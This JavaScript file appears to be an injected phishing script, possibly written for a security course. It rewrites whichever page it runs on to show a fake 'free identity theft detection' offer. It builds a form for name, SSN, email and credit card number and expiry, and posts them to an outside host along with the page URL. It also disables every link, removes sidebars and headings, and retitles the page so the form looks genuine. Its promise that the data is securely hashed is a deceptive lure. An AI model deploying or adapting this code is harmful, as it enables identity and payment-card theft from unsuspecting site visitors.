var newBody = document.createElement("div");
newBody.innerHTML = `
<div width=60%>
    <h1 style='font-size: 24px; padding-top: 40px; padding-bottom: 20px'>The Internet is a Dangerous Place!</h1>
    <p style='font-size: 18px; padding: 5px 0px'>That's why we're excited to offer you free identity theft detection. We've decided to provide you with this service as a direct result of the many recent data breaches across the web.</p>
    <p style='font-size: 18px; padding: 5px 0px'>Any information that you enter here will allow us to monitor the dark web for evidence that your identity is being traded online. At the very least, your name, social security number and email address are required.</p>
    <p style='font-size: 18px; padding: 5px 0px'>If you provide us with your credit card, we can track its usage for suspicious activity as well!</p>
    <p style='font-size: 18px; padding: 5px 0px'>All information provided (except your email, so we can contact you) is securely hashed and cannot be recovered by a third party in the event of a breach.</p>

    <form method="post" action='https://cse331.andrewjaffie.me/submitform'>
        <p>Required fields are followed by <strong><abbr title="required">*</abbr></strong>.</p>
        <section>
            <h2>Contact information</h2>
            <p>
              <label for="fname">
                <span>First name: </span>
                <strong><abbr title="required">*</abbr></strong>
              </label>
              <input type="text" id="fname" name="FirstName">
            </p>
            <p>
            <label for="lname">
              <span>Last name: </span>
              <strong><abbr title="required">*</abbr></strong>
            </label>
            <input type="text" id="lname" name="LastName">
          </p>
          <p>
            <label for="ssn">
              <span>SSN: </span>
              <strong><abbr title="required">*</abbr></strong>
            </label>
            <input type="text" id="ssn" name="SSN">
          </p>
            <p>
              <label for="mail">
                <span>E-mail: </span>
                <strong><abbr title="required">*</abbr></strong>
              </label>
              <input type="email" id="mail" name="email">
            </p>
        </section>
        <section>
            <h2>Credit Card Information</h2>
            <p>
              <label for="card">
                <span>Card type:</span>
              </label>
              <select id="card" name="CCType">
                <option value="visa">Visa</option>
                <option value="mc">Mastercard</option>
                <option value="amex">American Express</option>
              </select>
            </p>
            <p>
              <label for="number">
                <span>Card number:</span>
              </label>
                <input type="number" id="number" name="CCNumber">
            </p>
            <p>
              <label for="date">
                <span>Expiration date:</span>
                <em>formatted as mmyy</em>
              </label>
              <input type="text" id="date" name="CCExpiration">
            </p>
        </section>
        <section>
            <p> <button type="submit">Submit</button> </p>
        </section>
        <input type='hidden' name='formurl' id='formurl'>
    </form>
</div>
`;
newBody.setAttribute('style', 'text-align: center');

var toReplace = null;
var possible = document.getElementsByTagName('div');
for(var i=0; i < possible.length; i++){
    element = possible[i];
    if(element.getAttribute('role') != null && ['', 'main'].includes(element.getAttribute('role'))){
        toReplace = element;
        break;
    }
}
if(toReplace == null){
    for(var i=0; i < possible.length; i++){
        element = possible[i];
        if(element.getAttribute('id') != null && (element.getAttribute('id').includes('content') || element.getAttribute('id').includes('main'))){
            toReplace = element;
            break;
        }
    }
}
if(toReplace == null){
    var inHeader = [];
    if(document.getElementsByTagName('header').length > 0){
        inHeader.push(document.getElementsByTagName('header')[0].querySelectorAll('div'));
    }
    for(var i=0; i < possible.length; i++){
        element = possible[i];
        if(element.getAttribute('class') === 'container' && inHeader != [] && !(Array.from(inHeader[0]).includes(element))){
            toReplace = element;
            break;
        }
    }
}
links = document.getElementsByTagName('a');
for(var i=0; i < links.length; i++){
    links[i].onclick = function(){return false;};
}

for(var i=0; i < possible.length; i++){
    element = possible[i];
    if((element.getAttribute('class') != null && element.getAttribute('class').includes('sidebar')) 
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('sidebar'))
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('right'))
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('left'))){
            element.parentElement.removeChild(element);
        }
}
var h1s = document.getElementsByTagName('h1');
for(var i=0; i < h1s.length; i++)
    h1s[i].parentElement.removeChild(h1s[i]);
document.title = 'The Internet is a Dangerous Place!';

toReplace.parentElement.replaceChild(newBody, toReplace);
document.getElementById('formurl').value=window.location.href;